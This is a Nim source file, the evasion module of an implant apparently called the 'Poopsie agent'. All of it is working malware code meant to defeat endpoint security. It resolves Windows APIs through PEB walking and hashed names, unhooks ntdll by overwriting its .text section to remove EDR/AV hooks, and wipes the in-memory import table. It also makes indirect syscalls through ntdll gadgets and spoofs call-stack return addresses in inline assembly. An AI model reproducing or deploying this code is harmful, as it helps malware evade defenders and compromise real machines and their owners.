## Evasion module for Poopsie agent.
## Provides compile-time evasion techniques:
## - DFR: Dynamic Function Resolution via PEB walk
## - IAT obfuscation: Wipe import directory in memory
## - NTDLL unhooking: Load fresh ntdll from disk to bypass hooks

import winim/lean
import strenc

# ---- PEB structures ----
type
  PebLdrData {.pure.} = object
    length: ULONG
    initialized: BOOLEAN
    ssHandle: PVOID
    inLoadOrderModuleList: LIST_ENTRY
    inMemoryOrderModuleList: LIST_ENTRY
    inInitializationOrderModuleList: LIST_ENTRY

  LdrDataTableEntry {.pure.} = object
    inLoadOrderLinks: LIST_ENTRY
    inMemoryOrderLinks: LIST_ENTRY
    inInitializationOrderLinks: LIST_ENTRY
    dllBase: PVOID
    entryPoint: PVOID
    sizeOfImage: ULONG
    fullDllName: UNICODE_STRING
    baseDllName: UNICODE_STRING

# ---- Hash functions ----

proc djb2HashUnicode*(s: ptr UncheckedArray[WCHAR], length: int): uint32 =
  ## DJB2 hash for Unicode (wide) strings, case insensitive
  result = 5381'u32
  for i in 0 ..< length:
    var c = cast[uint32](s[i])
    if c >= 0x41'u32 and c <= 0x5A'u32:
      c = c + 0x20'u32
    result = result * 33 + c

proc djb2HashAscii*(s: openArray[byte]): uint32 =
  ## DJB2 hash for ASCII byte strings
  result = 5381'u32
  for b in s:
    result = result * 33 + cast[uint32](b)

proc djb2HashStr*(s: string): uint32 =
  ## DJB2 hash for string
  result = 5381'u32
  for c in s:
    result = result * 33 + cast[uint32](c)

proc djb2HashStrLower*(s: string): uint32 =
  ## DJB2 hash for string, lowercase
  result = 5381'u32
  for c in s:
    var ch = cast[uint32](c)
    if ch >= 0x41'u32 and ch <= 0x5A'u32:
      ch = ch + 0x20'u32
    result = result * 33 + ch

# ---- PEB Walking ----

when defined(evasion_dfr) or defined(evasion_unhook_ntdll) or defined(evasion_iat_obf) or defined(evasion_indirect_syscalls) or defined(evasion_stack_spoof):
  proc getPeb(): pointer =
    ## Get the PEB via inline assembly
    when defined(amd64):
      {.emit: """
        void* peb;
        __asm__ volatile("movq %%gs:0x60, %0" : "=r"(peb));
        `result` = peb;
      """.}
    else:
      {.emit: """
        void* peb;
        __asm__ volatile("movl %%fs:0x30, %0" : "=r"(peb));
        `result` = peb;
      """.}

  proc getModuleByHash*(moduleHash: uint32): pointer =
    ## Walk the PEB InMemoryOrderModuleList to find a module by DJB2 hash of its name
    let peb = getPeb()
    if peb == nil:
      return nil

    # PEB -> Ldr
    when defined(amd64):
      let ldr = cast[ptr PebLdrData](cast[ptr pointer](cast[int](peb) + 0x18)[])
    else:
      let ldr = cast[ptr PebLdrData](cast[ptr pointer](cast[int](peb) + 0x0C)[])

    if ldr == nil:
      return nil

    let listHead = addr ldr.inMemoryOrderModuleList
    var current = listHead.Flink

    while current != listHead:
      # The LDR_DATA_TABLE_ENTRY starts at offset -0x10 (x64) or -0x08 (x86)
      # from the InMemoryOrderLinks LIST_ENTRY
      when defined(amd64):
        let entry = cast[ptr LdrDataTableEntry](cast[int](current) - 0x10)
      else:
        let entry = cast[ptr LdrDataTableEntry](cast[int](current) - 0x08)

      if entry.baseDllName.Length > 0 and entry.baseDllName.Buffer != nil:
        let nameLen = entry.baseDllName.Length div 2
        let namePtr = cast[ptr UncheckedArray[WCHAR]](entry.baseDllName.Buffer)
        let hash = djb2HashUnicode(namePtr, nameLen.int)
        if hash == moduleHash:
          return entry.dllBase

      current = current.Flink

    return nil

when defined(evasion_dfr) or defined(evasion_indirect_syscalls):
  proc getExportByHash*(moduleBase: pointer, functionHash: uint32): pointer =
    ## Parse PE export table and find an export by DJB2 hash
    if moduleBase == nil:
      return nil

    let dosHeader = cast[PIMAGE_DOS_HEADER](moduleBase)
    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[int](moduleBase) + dosHeader.e_lfanew)

    let exportDirRVA = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    let exportDirSize = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size

    if exportDirRVA == 0:
      return nil

    let exportDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](moduleBase) + exportDirRVA.int)

    let names = cast[ptr UncheckedArray[DWORD]](cast[int](moduleBase) + exportDir.AddressOfNames.int)
    let functions = cast[ptr UncheckedArray[DWORD]](cast[int](moduleBase) + exportDir.AddressOfFunctions.int)
    let ordinals = cast[ptr UncheckedArray[WORD]](cast[int](moduleBase) + exportDir.AddressOfNameOrdinals.int)

    for i in 0 ..< exportDir.NumberOfNames.int:
      let namePtr = cast[ptr byte](cast[int](moduleBase) + names[i].int)

      # Read function name bytes until null
      var nameBytes: seq[byte] = @[]
      var j = 0
      while true:
        let b = cast[ptr byte](cast[int](namePtr) + j)[]
        if b == 0:
          break
        nameBytes.add(b)
        j += 1

      let hash = djb2HashAscii(nameBytes)
      if hash == functionHash:
        let ordinal = ordinals[i].int
        let funcRVA = functions[ordinal]

        # Check for forwarded export
        let funcAddr = cast[int](moduleBase) + funcRVA.int
        let exportStart = cast[int](moduleBase) + exportDirRVA.int
        let exportEnd = exportStart + exportDirSize.int
        if funcAddr >= exportStart and funcAddr < exportEnd:
          return nil  # Forwarded - skip

        return cast[pointer](funcAddr)

    return nil

  proc resolveFunction*(moduleNameHash: uint32, functionNameHash: uint32): pointer =
    ## Resolve a function at runtime using PEB walk + export table parsing
    let moduleBase = getModuleByHash(moduleNameHash)
    if moduleBase == nil:
      return nil
    return getExportByHash(moduleBase, functionNameHash)

# ---- NTDLL Unhooking ----

when defined(evasion_unhook_ntdll):
  proc unhookNtdll*() =
    ## Load a fresh copy of ntdll.dll from disk and overwrite the .text section
    ## to remove any userland hooks placed by EDR/AV
    let ntdllHash = djb2HashStrLower("ntdll.dll")
    let ntdllBase = getModuleByHash(ntdllHash)
    if ntdllBase == nil:
      return

    let ntdllPath: LPCSTR = obf("C:\\Windows\\System32\\ntdll.dll")
    let nullHandle: HANDLE = 0

    let file = CreateFileA(
      ntdllPath,
      cast[DWORD](GENERIC_READ),
      cast[DWORD](FILE_SHARE_READ),
      cast[LPSECURITY_ATTRIBUTES](NULL),
      cast[DWORD](OPEN_EXISTING),
      cast[DWORD](FILE_ATTRIBUTE_NORMAL),
      nullHandle
    )
    if file == INVALID_HANDLE_VALUE:
      return

    let mapping = CreateFileMappingA(file, nil, PAGE_READONLY, 0, 0, nil)
    if mapping == 0:
      discard CloseHandle(file)
      return

    let mappedBase = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0)
    if mappedBase == nil:
      discard CloseHandle(mapping)
      discard CloseHandle(file)
      return

    # Parse the clean copy to find .text section
    let cleanDos = cast[PIMAGE_DOS_HEADER](mappedBase)
    let cleanNt = cast[PIMAGE_NT_HEADERS](cast[int](mappedBase) + cleanDos.e_lfanew)
    let numSections = cleanNt.FileHeader.NumberOfSections

    let firstSection = IMAGE_FIRST_SECTION(cleanNt)

    for i in 0 ..< numSections.int:
      let section = cast[PIMAGE_SECTION_HEADER](cast[int](firstSection) + i * IMAGE_SIZEOF_SECTION_HEADER)
      let nameArr = section.Name

      # Check for ".text"
      if nameArr[0] == byte('.') and nameArr[1] == byte('t') and nameArr[2] == byte('e') and
         nameArr[3] == byte('x') and nameArr[4] == byte('t'):
        let cleanText = cast[pointer](cast[int](mappedBase) + section.PointerToRawData.int)
        let hookedText = cast[pointer](cast[int](ntdllBase) + section.VirtualAddress.int)
        let textSize = section.Misc.VirtualSize.int

        var oldProtect: DWORD
        if VirtualProtect(hookedText, textSize.SIZE_T, PAGE_EXECUTE_READWRITE, addr oldProtect) == 0:
          break

        copyMem(hookedText, cleanText, textSize)

        var temp: DWORD
        discard VirtualProtect(hookedText, textSize.SIZE_T, oldProtect, addr temp)
        break

    discard UnmapViewOfFile(mappedBase)
    discard CloseHandle(mapping)
    discard CloseHandle(file)

# ---- IAT Obfuscation ----

when defined(evasion_iat_obf):
  proc getCurrentModuleBaseIAT(): pointer =
    ## Get the base address of the current process image from PEB
    let peb = getPeb()
    if peb == nil:
      return nil
    when defined(amd64):
      return cast[ptr pointer](cast[int](peb) + 0x10)[]
    else:
      return cast[ptr pointer](cast[int](peb) + 0x08)[]

  proc obfuscateIat*() =
    ## Wipe the import directory in memory to hide imported function names
    let moduleBase = getCurrentModuleBaseIAT()
    if moduleBase == nil:
      return

    let dosHeader = cast[PIMAGE_DOS_HEADER](moduleBase)
    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[int](moduleBase) + dosHeader.e_lfanew)

    let importDirRVA = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
    let importDirSize = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size

    if importDirRVA == 0 or importDirSize == 0:
      return

    let importDir = cast[pointer](cast[int](moduleBase) + importDirRVA.int)

    var oldProtect: DWORD
    if VirtualProtect(importDir, importDirSize.int.SIZE_T, PAGE_READWRITE, addr oldProtect) == 0:
      return

    zeroMem(importDir, importDirSize.int)

    var temp: DWORD
    discard VirtualProtect(importDir, importDirSize.int.SIZE_T, oldProtect, addr temp)

# ---- Indirect Syscalls ----

when defined(evasion_indirect_syscalls):
  var syscallGadget*: pointer = nil

  proc findSyscallGadget*(): pointer =
    ## Scan ntdll .text section for a `syscall; ret` (0x0F 0x05 0xC3) gadget.
    ## Returns the address, which is used to jmp to instead of executing syscall inline.
    let ntdllHash = djb2HashStrLower("ntdll.dll")
    let ntdllBase = getModuleByHash(ntdllHash)
    if ntdllBase == nil:
      return nil

    let dosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[int](ntdllBase) + dosHeader.e_lfanew)
    let numSections = ntHeaders.FileHeader.NumberOfSections
    let firstSection = IMAGE_FIRST_SECTION(ntHeaders)

    for i in 0 ..< numSections.int:
      let section = cast[PIMAGE_SECTION_HEADER](cast[int](firstSection) + i * IMAGE_SIZEOF_SECTION_HEADER)
      let nameArr = section.Name

      if nameArr[0] == byte('.') and nameArr[1] == byte('t') and nameArr[2] == byte('e') and
         nameArr[3] == byte('x') and nameArr[4] == byte('t'):
        let textStart = cast[ptr UncheckedArray[byte]](cast[int](ntdllBase) + section.VirtualAddress.int)
        let textSize = section.Misc.VirtualSize.int

        for j in 0 ..< (textSize - 2):
          if textStart[j] == 0x0F'u8 and textStart[j + 1] == 0x05'u8 and textStart[j + 2] == 0xC3'u8:
            return cast[pointer](cast[int](textStart) + j)
        break

    return nil

  proc getSsn*(functionHash: uint32): int32 =
    ## Extract the syscall number (SSN) from an Nt* function stub in ntdll.
    ## Typical stub: mov r10, rcx (4C 8B D1); mov eax, <SSN> (B8 xx xx 00 00)
    let ntdllHash = djb2HashStrLower("ntdll.dll")
    let ntdllBase = getModuleByHash(ntdllHash)
    if ntdllBase == nil:
      return -1

    let funcAddr = getExportByHash(ntdllBase, functionHash)
    if funcAddr == nil:
      return -1

    let fb = cast[ptr UncheckedArray[byte]](funcAddr)
    # Look for B8 at offset 3 or 4 (depending on stub variant)
    if fb[3] == 0xB8'u8:
      return cast[ptr int32](cast[int](funcAddr) + 4)[]
    elif fb[4] == 0xB8'u8:
      return cast[ptr int32](cast[int](funcAddr) + 5)[]
    return -1

  proc initIndirectSyscalls*() =
    ## Cache the syscall gadget address for later use.
    syscallGadget = findSyscallGadget()

  when defined(amd64):
    proc indirectSyscall*(ssn: uint32, gadget: pointer, arg1, arg2, arg3, arg4: uint): int32 =
      ## Execute a syscall indirectly by jumping to a syscall;ret gadget in ntdll.
      {.emit: """
        int status;
        __asm__ volatile(
          "mov r10, rcx\n\t"
          "mov eax, %[ssn]\n\t"
          "jmp *%[gadget]\n\t"
          : "=a"(status)
          : [ssn] "r"((unsigned int)`ssn`),
            [gadget] "r"(`gadget`),
            "c"(`arg1`), "d"(`arg2`),
            "D"(`arg3`), "S"(`arg4`)
          : "r10", "r8", "r9", "memory"
        );
        `result` = status;
      """.}

# ---- Stack Spoofing ----

when defined(evasion_stack_spoof):
  var spoofAddr*: pointer = nil

  proc findRetGadget(moduleBase: pointer): pointer =
    if moduleBase == nil:
      return nil

    let dosHeader = cast[PIMAGE_DOS_HEADER](moduleBase)
    let ntHeaders = cast[PIMAGE_NT_HEADERS](cast[int](moduleBase) + dosHeader.e_lfanew)
    let numSections = ntHeaders.FileHeader.NumberOfSections
    let firstSection = IMAGE_FIRST_SECTION(ntHeaders)

    for i in 0 ..< numSections.int:
      let section = cast[PIMAGE_SECTION_HEADER](cast[int](firstSection) + i * IMAGE_SIZEOF_SECTION_HEADER)
      let nameArr = section.Name

      if nameArr[0] == byte('.') and nameArr[1] == byte('t') and nameArr[2] == byte('e') and
         nameArr[3] == byte('x') and nameArr[4] == byte('t'):
        let textStart = cast[ptr UncheckedArray[byte]](cast[int](moduleBase) + section.VirtualAddress.int)
        let textSize = section.Misc.VirtualSize.int
        let startOff = textSize div 4

        for j in startOff ..< textSize:
          if textStart[j] == 0xC3'u8:
            return cast[pointer](cast[int](textStart) + j)
        break

    return nil

  proc initStackSpoof*() =
    let k32Hash = djb2HashStrLower("kernel32.dll")
    let k32Base = getModuleByHash(k32Hash)
    let ntdllHash = djb2HashStrLower("ntdll.dll")
    let ntdllBase = getModuleByHash(ntdllHash)
    let fakeRetK32 = findRetGadget(k32Base)
    let fakeRetNtdll = findRetGadget(ntdllBase)
    if fakeRetK32 != nil:
      spoofAddr = fakeRetK32
    elif fakeRetNtdll != nil:
      spoofAddr = fakeRetNtdll

  when defined(amd64):
    proc callWithSpoofedStack*(funcPtr: pointer, arg1, arg2, arg3, arg4: uint): uint =
      if spoofAddr == nil:
        let f = cast[proc(a1, a2, a3, a4: uint): uint {.cdecl.}](funcPtr)
        return f(arg1, arg2, arg3, arg4)
      {.emit: """
        unsigned long long res;
        __asm__ volatile(
          ".intel_syntax noprefix\n\t"
          "push rbp\n\t"
          "lea rbp, [rsp - 8]\n\t"
          "push %[spoof]\n\t"
          "mov rcx, %[a1]\n\t"
          "mov rdx, %[a2]\n\t"
          "mov r8, %[a3]\n\t"
          "mov r9, %[a4]\n\t"
          "sub rsp, 32\n\t"
          "call %[func]\n\t"
          "add rsp, 40\n\t"
          "pop rbp\n\t"
          ".att_syntax prefix\n\t"
          : "=a"(res)
          : [func] "r"(`funcPtr`),
            [spoof] "r"(`spoofAddr`),
            [a1] "r"((unsigned long long)`arg1`),
            [a2] "r"((unsigned long long)`arg2`),
            [a3] "r"((unsigned long long)`arg3`),
            [a4] "r"((unsigned long long)`arg4`)
          : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
        );
        `result` = res;
      """.}

    proc callWithSpoofedStack5*(funcPtr: pointer, arg1, arg2, arg3, arg4, arg5: uint): uint =
      if spoofAddr == nil:
        let f = cast[proc(a1, a2, a3, a4, a5: uint): uint {.cdecl.}](funcPtr)
        return f(arg1, arg2, arg3, arg4, arg5)
      {.emit: """
        unsigned long long res;
        unsigned long long stackArgs5[1] = { (unsigned long long)`arg5` };
        __asm__ volatile(
          ".intel_syntax noprefix\n\t"
          "push rbp\n\t"
          "lea rbp, [rsp - 8]\n\t"
          "push %[spoof]\n\t"
          "mov rcx, %[a1]\n\t"
          "mov rdx, %[a2]\n\t"
          "mov r8, %[a3]\n\t"
          "mov r9, %[a4]\n\t"
          "sub rsp, 40\n\t"
          "mov rax, [%[sa]]\n\t"
          "mov [rsp + 32], rax\n\t"
          "call %[func]\n\t"
          "add rsp, 48\n\t"
          "pop rbp\n\t"
          ".att_syntax prefix\n\t"
          : "=a"(res)
          : [func] "r"(`funcPtr`),
            [spoof] "r"(`spoofAddr`),
            [a1] "r"((unsigned long long)`arg1`),
            [a2] "r"((unsigned long long)`arg2`),
            [a3] "r"((unsigned long long)`arg3`),
            [a4] "r"((unsigned long long)`arg4`),
            [sa] "r"(stackArgs5)
          : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
        );
        `result` = res;
      """.}

    proc callWithSpoofedStack7*(funcPtr: pointer, arg1, arg2, arg3, arg4, arg5, arg6, arg7: uint): uint =
      if spoofAddr == nil:
        let f = cast[proc(a1, a2, a3, a4, a5, a6, a7: uint): uint {.cdecl.}](funcPtr)
        return f(arg1, arg2, arg3, arg4, arg5, arg6, arg7)
      {.emit: """
        unsigned long long res;
        unsigned long long stackArgs7[3] = {
          (unsigned long long)`arg5`,
          (unsigned long long)`arg6`,
          (unsigned long long)`arg7`
        };
        __asm__ volatile(
          ".intel_syntax noprefix\n\t"
          "push rbp\n\t"
          "lea rbp, [rsp - 8]\n\t"
          "push %[spoof]\n\t"
          "mov rcx, %[a1]\n\t"
          "mov rdx, %[a2]\n\t"
          "mov r8, %[a3]\n\t"
          "mov r9, %[a4]\n\t"
          "sub rsp, 56\n\t"
          "mov rax, [%[sa]]\n\t"
          "mov [rsp + 32], rax\n\t"
          "mov rax, [%[sa] + 8]\n\t"
          "mov [rsp + 40], rax\n\t"
          "mov rax, [%[sa] + 16]\n\t"
          "mov [rsp + 48], rax\n\t"
          "call %[func]\n\t"
          "add rsp, 64\n\t"
          "pop rbp\n\t"
          ".att_syntax prefix\n\t"
          : "=a"(res)
          : [func] "r"(`funcPtr`),
            [spoof] "r"(`spoofAddr`),
            [a1] "r"((unsigned long long)`arg1`),
            [a2] "r"((unsigned long long)`arg2`),
            [a3] "r"((unsigned long long)`arg3`),
            [a4] "r"((unsigned long long)`arg4`),
            [sa] "r"(stackArgs7)
          : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
        );
        `result` = res;
      """.}

    proc callWithSpoofedStack10*(funcPtr: pointer, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10: uint): uint =
      if spoofAddr == nil:
        let f = cast[proc(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10: uint): uint {.cdecl.}](funcPtr)
        return f(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10)
      {.emit: """
        unsigned long long res;
        unsigned long long stackArgs10[6] = {
          (unsigned long long)`a5`, (unsigned long long)`a6`,
          (unsigned long long)`a7`, (unsigned long long)`a8`,
          (unsigned long long)`a9`, (unsigned long long)`a10`
        };
        __asm__ volatile(
          ".intel_syntax noprefix\n\t"
          "push rbp\n\t"
          "lea rbp, [rsp - 8]\n\t"
          "push %[spoof]\n\t"
          "mov rcx, %[v1]\n\t"
          "mov rdx, %[v2]\n\t"
          "mov r8, %[v3]\n\t"
          "mov r9, %[v4]\n\t"
          "sub rsp, 80\n\t"
          "mov rax, [%[sa]]\n\t"
          "mov [rsp + 32], rax\n\t"
          "mov rax, [%[sa] + 8]\n\t"
          "mov [rsp + 40], rax\n\t"
          "mov rax, [%[sa] + 16]\n\t"
          "mov [rsp + 48], rax\n\t"
          "mov rax, [%[sa] + 24]\n\t"
          "mov [rsp + 56], rax\n\t"
          "mov rax, [%[sa] + 32]\n\t"
          "mov [rsp + 64], rax\n\t"
          "mov rax, [%[sa] + 40]\n\t"
          "mov [rsp + 72], rax\n\t"
          "call %[func]\n\t"
          "add rsp, 88\n\t"
          "pop rbp\n\t"
          ".att_syntax prefix\n\t"
          : "=a"(res)
          : [func] "r"(`funcPtr`),
            [spoof] "r"(`spoofAddr`),
            [v1] "r"((unsigned long long)`a1`),
            [v2] "r"((unsigned long long)`a2`),
            [v3] "r"((unsigned long long)`a3`),
            [v4] "r"((unsigned long long)`a4`),
            [sa] "r"(stackArgs10)
          : "rcx", "rdx", "r8", "r9", "r10", "r11", "memory"
        );
        `result` = res;
      """.}

# ---- Initialization ----

proc runEvasionInit*() =
  ## Run all enabled evasion techniques. Call as early as possible.
  when defined(evasion_unhook_ntdll):
    unhookNtdll()

  when defined(evasion_indirect_syscalls):
    initIndirectSyscalls()

  when defined(evasion_stack_spoof):
    initStackSpoof()

  when defined(evasion_iat_obf):
    obfuscateIat()
